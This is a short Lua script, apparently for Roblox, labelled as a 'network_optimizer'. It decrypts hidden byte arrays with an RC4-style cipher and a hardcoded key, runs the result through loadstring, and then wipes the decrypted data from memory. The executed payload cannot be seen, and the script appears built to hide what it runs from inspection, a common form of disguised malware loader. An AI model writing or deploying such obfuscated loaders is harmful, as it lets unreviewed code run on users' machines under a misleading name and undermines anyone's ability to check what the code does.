-- Protected Segment (network_optimizer)
local XpmvEzBB = 99
local jScMifBT = {
{39,134,133,151,140,114,233,162,164,88,199,114,81,159,221,172,50,239,130,199,71,45,123,190,85,122,141,143,150,138,56,147,62,147,59,83,123,153,187,52,30,142,220,206,189,84,161,124,193,40,66,67,242,62,141,128,64,8,180,191},{218,162,14,73,254,29,29,200,124,18,238,77,16,128,167,20,15,245,154,216,89,227,185,84,142,171,145,233,126,222,94,12,87,206,192,86,46,93,196,197,95,173,203,151,200,78,102,147,88,190,6,66,193,255,3,248,10,143,85,158},{113,16,113,20,42,252,2,188,146,8,169,208,194,131,18,196,236,246,210,203,233,14,40,59,18,41,18,186,206}
}
local lFOyPqgS = "nFuShJTAOgpmhbvR"

local function tlamBjQn(HNukhtGt_data, HNukhtGt_key)
    if type(HNukhtGt_key) ~= "string" or #HNukhtGt_key == 0 then return "" end
    local HNukhtGt = {}
    for wDbZDpAA = 0, 255 do HNukhtGt[wDbZDpAA] = wDbZDpAA end
    local icRlCJeZ = 0
    for wDbZDpAA = 0, 255 do
        local rZnWYBiy = HNukhtGt_key:byte((wDbZDpAA % #HNukhtGt_key) + 1)
        icRlCJeZ = (icRlCJeZ + HNukhtGt[wDbZDpAA] + rZnWYBiy) % 256
        HNukhtGt[wDbZDpAA], HNukhtGt[icRlCJeZ] = HNukhtGt[icRlCJeZ], HNukhtGt[wDbZDpAA]
    end
    local wDbZDpAA = 0
    local icRlCJeZ = 0
    local OrgUCALi = {}
    for _, rggzzXts in ipairs(HNukhtGt_data) do
        wDbZDpAA = (wDbZDpAA + 1) % 256
        icRlCJeZ = (icRlCJeZ + HNukhtGt[wDbZDpAA]) % 256
        HNukhtGt[wDbZDpAA], HNukhtGt[icRlCJeZ] = HNukhtGt[icRlCJeZ], HNukhtGt[wDbZDpAA]
        local rZnWYBiy = HNukhtGt[(HNukhtGt[wDbZDpAA] + HNukhtGt[icRlCJeZ]) % 256]
        local unmasked = bit32.bxor(rggzzXts, XpmvEzBB)
        table.insert(OrgUCALi, string.char(bit32.bxor(unmasked, rZnWYBiy)))
    end
    return table.concat(OrgUCALi)
end

local HNukhtGt_flat = {}
for _, chunk in ipairs(jScMifBT) do
    for _, byte in ipairs(chunk) do
        table.insert(HNukhtGt_flat, byte)
    end
end

local decrypted = tlamBjQn(HNukhtGt_flat, lFOyPqgS)
local xonUlvjb, hStymZYU = loadstring(decrypted)

-- Immediate Memory Sanitation: Overwrite decrypted variables
table.clear(HNukhtGt_flat)
HNukhtGt_flat = nil

if xonUlvjb then 
    local result = xonUlvjb() 
    decrypted = nil
    xonUlvjb = nil
    return result
else 
    decrypted = nil
    warn("[ecco] Boot Error (" .. "network_optimizer" .. "): " .. tostring(hStymZYU)) 
end
